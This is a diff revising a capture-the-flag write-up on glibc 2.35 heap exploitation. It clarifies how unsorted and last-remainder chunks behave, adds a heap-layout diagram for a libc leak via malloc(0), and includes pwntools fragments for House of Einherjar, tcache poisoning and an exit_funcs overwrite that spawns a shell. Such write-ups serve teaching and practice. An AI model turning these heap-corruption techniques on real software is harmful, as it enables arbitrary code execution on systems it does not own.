@@ -430,17 +430,29 @@ Note the following behaviour of unsorted chunks:
 #define initial_top(M)              (unsorted_chunks (M))
 ```
 
-So, the unsorted chunk is like a temporary "forest" - it stores a chunk that wants to be serviced in place of forest.
-This means some `malloc()` operations on top also happen to unsorted chunks, allowing it to even service smaller chunks,
-and retain its unsortedness - without going into smallbin. This is known as the last remainder chunk.
+So, the unsorted chunk is like a temporary "forest" - it wants to be serviced in place of forest. This means some
+`malloc()` operations on top also happen to unsorted chunks, allowing it to even do stuff like splitting and servicing
+smaller chunks, while retaining its unsortedness without going into smallbin. This chunk is known as the last remainder
+chunk.
 
 Also, we can leak libc through a few tricks. The fake chunk contains `main_arena` which we can use to leak libc.
-However, since we're printing using `printf`, we can't view the fake chunk directly from `view_inventory`. However, if
-we can get a chunk that aligns with the fake chunk without overwriting the `fd` ptr, we can then leak libc.
+However, since we're printing using `printf` and `%s`, we can't view the fake chunk directly from `view_inventory`
+because of the null bytes. However, if we can get a chunk that aligns with the fake chunk without overwriting the `fd`
+ptr, we can then leak libc.
 
 In the wishing well, the behaviour of `malloc(0)` is just to allocate the smallest chunk available, `0x21`. Therefore,
 this allows us to allocate a chunk at the top of our fake chunk without overwriting anything, hence allowing us to leak
 libc.
+
+```
+0x00: 0x0000000000000000 0x0000000000000061
+0x10: 0x0000000000000000 0x0000000000000021 
+0x20: 0x0000000000000020 0x0000000000000020 <- malloc(0) returns a pointer to 0x20
+0x30: 0x0000000000000000 0x0000000000000131 (in unsorted bin)
+0x40: 0x0000000000000020 0x0000000000000040
+0x50: 0x0000000000000000 0x0000000000000000
+0x60: 0x0000000000000000 0x0000000000000000 
+```
 
 From here, exploitation is simple. On 2.35, without `__free_hook`, we can either attack `exit_funcs` or perform {%
 post_link fsop/house-of-apple %}. I chose to do `exit_funcs` here.
@@ -448,8 +460,8 @@ post_link fsop/house-of-apple %}. I chose to do `exit_funcs` here.
 # Exploitation
 
 First, we need heap leak for the above. This can be gotten from (again!) the off-by-one in `read_str`, now on
-`username`, because in the player struct, `name` is right before the `inv[]` array. So by making sure the `name` has no
-null byte, we can leak the pointer to `inv[0]`.
+`username`, because in the player struct, `name` is right before the `inv[]` array. So by making sure `name` has no null
+byte, we can leak the pointer to `inv[0]`.
 
 ```py
 p.sendline(b"a"*32)
@@ -524,8 +536,7 @@ Now, we perform House of Einherjar.
 # the off-by-one will change chunk_8 PREV_INUSE bit to 0 cos of the appended null byte
 payload = flat(
     0x0, 0x1f0, # 0x1f0 must match the size to pass corrupted size vs. prev_size
-    heap_base + 0x9c0, heap_base + 0x9c0, # p = heap_base + 0x9c0, fd->bk == p, bk->fd == p to pass corrupted
-    double-linked list
+    heap_base + 0x9c0, heap_base + 0x9c0, # p = heap_base + 0x9c0, fd->bk == p, bk->fd == p to pass corrupted double-linked list
     b"a"*0x1d0,
     0x1f0, # this size (prev_size) must be such that chunk_8 - 0x1f0 points to the fd and bk ptrs
 )
@@ -549,7 +560,7 @@ libc_base = leak - 0x219fc0
 print(hex(libc_base))
 libc.address = libc_base
 ```
-We can now exploit last remainder chunk mechanism to do 1 read and 1 write, which is necessary for `exit_funcs` route.
+We can now exploit last remainder chunk mechanism to do 2 small writes, which is necessary for `exit_funcs` route.
 (House of Apple only needs 1 large write, it's a viable alternative). These are the targets we're interested in:
 ```py
 def encrypt(pos, ptr):
@@ -607,7 +618,7 @@ payload = flat(
 edit(p, 7, payload)
 ```
 
-Lastly, we free the poisoned tcache chunks and get our read and write primitive! Upon exit, we will get our shell.
+Lastly, we free the poisoned tcache chunks and get our write primitives! Upon exit, we will get our shell.
 
 ```py
 purchase(p, b"b"*0x10)
